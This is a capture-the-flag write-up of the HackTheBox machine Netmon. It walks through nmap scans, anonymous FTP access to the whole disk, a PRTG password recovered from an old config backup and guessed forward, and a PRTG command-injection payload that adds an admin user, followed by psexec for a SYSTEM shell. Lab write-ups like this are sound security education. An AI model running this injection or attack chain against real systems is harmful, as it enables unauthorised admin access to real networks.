---
title: HTB: Netmon
url: https://0xdf.gitlab.io/2019/06/29/htb-netmon.html
date: 2019-06-29T13:45:00+00:00
difficulty: Easy [20]
os: Windows
tags: htb-netmon, hackthebox, ctf, nmap, ftp, password-reuse, prtg, command-injection, psexec-py, htb-jerry, oscp-plus-v1, oscp-plus-v2
---

![Netmon-cover](https://0xdfimages.gitlab.io/img/netmon-cover.png)

Netmon rivals [Jerry](/2018/11/17/htb-jerry.html) and Blue for the shortest box I’ve done. The user first blood went in less than 2 minutes, and that’s probably longer than it should have been as the hackthebox page crashed right at open with so many people trying to submit flags. The host presents the full file system over anonymous FTP, which is enough to grab the user flag. It also hosts an instance of PRTG Network Monitor on port 80. I’ll use the FTP access to find old creds in a backup configuration file, and use those to guess the current creds. From there, I can use a command injection vulnerability in PRTG to get a shell as SYSTEM, and the root flag.

## Box Info

| Name | [Netmon](https://hackthebox.com/machines/netmon)  [Netmon](https://hackthebox.com/machines/netmon) [Play on HackTheBox](https://hackthebox.com/machines/netmon) |
| --- | --- |
| Release Date | [02 Mar 2019](https://twitter.com/hackthebox_eu/status/1101032274592706565) |
| Retire Date | 29 Jun 2019 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Netmon |
| Radar Graph | Radar chart for Netmon |
| First Blood User | 00:01:53[Baku Baku](https://app.hackthebox.com/users/80475) |
| First Blood Root | 00:54:48[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creator | [mrb3n mrb3n](https://app.hackthebox.com/users/2984) |

## Recon

### nmap

`nmap` shows a Windows box with lots of ports open.

```

root@kali# nmap -sT -p- --max-rate 10000 -oA scans/alltcp 10.10.10.152
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-02 14:01 EST
Nmap scan report for 10.10.10.152
Host is up (0.018s latency).
Not shown: 65493 closed ports, 30 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

root@kali# nmap -sV -sC -p 21,135,139,445,5985 -oA scans/scripts 10.10.10.152
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-04 14:20 EST
Nmap scan report for 10.10.10.152
Host is up (0.018s latency).

PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_03-04-19  02:12PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -6m46s, deviation: 0s, median: -6m46s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-03-04 14:13:48
|_  start_date: 2019-03-04 12:43:48

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.79 seconds

```

### HTTP - PRTG Network Monitor - TCP 80

The page is an instance of PRTG Network Monitor (NETMON):

![1551724718296](https://0xdfimages.gitlab.io/img/1551724718296.png)

Without creds at this point, Ill try the [default creds](https://www.cleancss.com/router-default/PRTG/PRTG_Network_Monitor) of “prtgadmin”/”prtgadmin”. Once they don’t work, I’ll move on to FTP.

### FTP - TCP 21

#### Login

As FTP allows anonymous login, I’ll check it out and see what I can find:

```

root@kali# ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-02-19  11:18PM                 1024 .rnd
02-25-19  09:15PM       <DIR>          inetpub
07-16-16  08:18AM       <DIR>          PerfLogs
02-25-19  09:56PM       <DIR>          Program Files
02-02-19  11:28PM       <DIR>          Program Files (x86)
02-03-19  07:08AM       <DIR>          Users
03-04-19  01:20PM       <DIR>          Windows
226 Transfer complete.

```

#### user.txt

It looks like the FTP root is the `C:\`. From here, I can grab `user.txt`:

```

ftp> cd users\
250 CWD command successful.

ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-25-19  10:44PM       <DIR>          Administrator
02-02-19  11:35PM       <DIR>          Public
226 Transfer complete.

ftp> cd Public
250 CWD command successful.

ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  07:05AM       <DIR>          Documents
07-16-16  08:18AM       <DIR>          Downloads
07-16-16  08:18AM       <DIR>          Music
07-16-16  08:18AM       <DIR>          Pictures
02-02-19  11:35PM                   33 user.txt
07-16-16  08:18AM       <DIR>          Videos
226 Transfer complete.

ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
33 bytes received in 0.01 secs (2.3148 kB/s)

```

On my local machine:

```

root@kali# cat user.txt
dd58ce67...

```

#### PRTG Network Monitor

In `\ProgramData\Paessler\PRTG Network Monitor`, I’ll find information about the PRTG Network Monitor application:

```

ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-02-19  11:40PM       <DIR>          Configuration Auto-Backups
03-04-19  12:44PM       <DIR>          Log Database
02-02-19  11:18PM       <DIR>          Logs (Debug)
02-02-19  11:18PM       <DIR>          Logs (Sensors)
02-02-19  11:18PM       <DIR>          Logs (System)
03-04-19  12:44PM       <DIR>          Logs (Web Server)
03-04-19  12:49PM       <DIR>          Monitoring Database
02-25-19  09:54PM              1189697 PRTG Configuration.dat
03-04-19  01:24PM              1227115 PRTG Configuration.old
07-14-18  02:13AM              1153755 PRTG Configuration.old.bak
03-04-19  01:25PM              1672215 PRTG Graph Data Cache.dat
02-25-19  10:00PM       <DIR>          Report PDFs
02-02-19  11:18PM       <DIR>          System Information Database
02-02-19  11:40PM       <DIR>          Ticket Database
02-02-19  11:18PM       <DIR>          ToDo Database
226 Transfer complete.

```

I’ll grab the three config files and look through them. When I see places in the `.dat` file and the `.old` file that might have passwords, it always looks like this:

```

            <dbpassword>
              <flags>
                <encrypted/>
              </flags>
            </dbpassword>

```

However, in `PRTG Configuration.old.bak`, I find this:

```

            <dbpassword>
              <!-- User: prtgadmin -->
              PrTg@dmin2018
            </dbpassword>

```

## Shell as SYSTEM

### Log In

Now that I have creds, I can try to log in. Unfortunately, trying the creds from the bak file returns:

![1551725353523](https://0xdfimages.gitlab.io/img/1551725353523.png)

However, on thinking a minute, the creds are from the backup of an old file, and end in “2018”. I’ll try 2019, and it works, bringing me to the PRTG dashboard for System Administrator:

![1551725422675](https://0xdfimages.gitlab.io/img/1551725422675.png)

### Command Injection

There’s a [blog post about command injection in PTRG](https://www.codewatch.org/blog/?p=453) from summer 2018. The command injection is in the parameters field of the notifications configuration with some of the default Demo scripts. A lot of the useful characters are filtered out, but he was able to get injection to add a new user to the account.

I’ll follow the post, and go to Setup > Account Settings > Notifications:

[![PRTG Account Settings Notifications](https://0xdfimages.gitlab.io/img/1551726438018.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1551726438018.png)

On the very right, I’ll hit the plus, and then “Add new notification”. Leaving everything else unchanged, I’ll scroll down to the bottom and select “Execute Program”. The injection is in the Parameter. I’ll select the demo ps1 file for the program file, and then enter `test.txt;net user anon p3nT3st! /add;net localgroup administrators anon /add`:

[![Execute Program](https://0xdfimages.gitlab.io/img/1551726674533.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1551726674533.png)

On hitting save, I’m back at the list of notifications. I’ll click the box next to my new on, and then the top icon of the bell to test the notification:

![1551726729729](https://0xdfimages.gitlab.io/img/1551726729729.png)

I get this:

![1551726741995](https://0xdfimages.gitlab.io/img/1551726741995.png)

After waiting a few seconds, I’ll run `smbmap` with my new user, and see I have full access:

```

root@kali# smbmap -H 10.10.10.152 -u anon -p "p3nT3st!"
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.152...
[+] IP: 10.10.10.152:445        Name: 10.10.10.152
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  READ, WRITE
        C$                                                      READ, WRITE
        IPC$                                                    READ ONLY

```

### Shell

Now I can use many different ways to get a shell. I’ll take a simple `psexec.py`:

```

root@kali# psexec.py 'anon:p3nT3st!@10.10.10.152'
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] Requesting shares on 10.10.10.152.....
[*] Found writable share ADMIN$
[*] Uploading file tbwyLJgn.exe
[*] Opening SVCManager on 10.10.10.152.....
[*] Creating service PdOp on 10.10.10.152.....
[*] Starting service PdOp.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```

From there, I can grab `root.txt`:

```

C:\Users\Administrator\Desktop>type root.txt
3018977f...

```